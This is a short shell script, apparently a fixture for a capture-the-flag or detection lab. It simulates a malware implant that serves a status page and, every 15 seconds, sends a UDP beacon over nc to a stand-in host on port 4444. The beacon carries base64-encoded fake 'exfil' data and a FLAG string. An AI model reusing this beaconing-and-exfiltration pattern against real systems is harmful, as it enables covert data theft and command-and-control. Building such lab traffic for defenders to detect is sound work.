#!/bin/sh
umask 022
mkdir -p /www /run
: > /www/status.html
: > /run/counter

(
  while [ 1 ]; do
    n=$(wc -l < /run/counter 2>/dev/null || echo 0)
    printf '<html><body style="font-family:monospace;background:#0d0f12;color:#8fbf9f"><h2>Implant status</h2><p>bot: %s</p><p>beacons sent: %s</p><p>cadence: ~15s</p></body></html>\n' "${BOT_ID:-keq1937}" "$n" > /www/status.html
    sleep 2
  done
) &

(
  while [ 1 ]; do
    TARGET="${TARGET_HOST:-somacloud-t0}"
    IP=$(getent hosts "$TARGET" | awk '{print $1}')
    if [ -n "$IP" ]; then
      EXFIL=$(printf 'HR_SALARIES_2026.xlsx|segment:globex-eu|FLAG{beacon_c2_detected}' | base64 | tr -d '\n')
      printf 'BEACON|v1.4|bot=%s|campaign=g312|segment:eu-west|exfil=%s\n' "${BOT_ID:-keq1937}" "$EXFIL" | nc -u -w1 "$IP" 4444
      printf '%s\n' "$(date -u +%s)" >> /run/counter
    fi
    sleep 15
  done
) &

exec python3 -m http.server 8080 --directory /www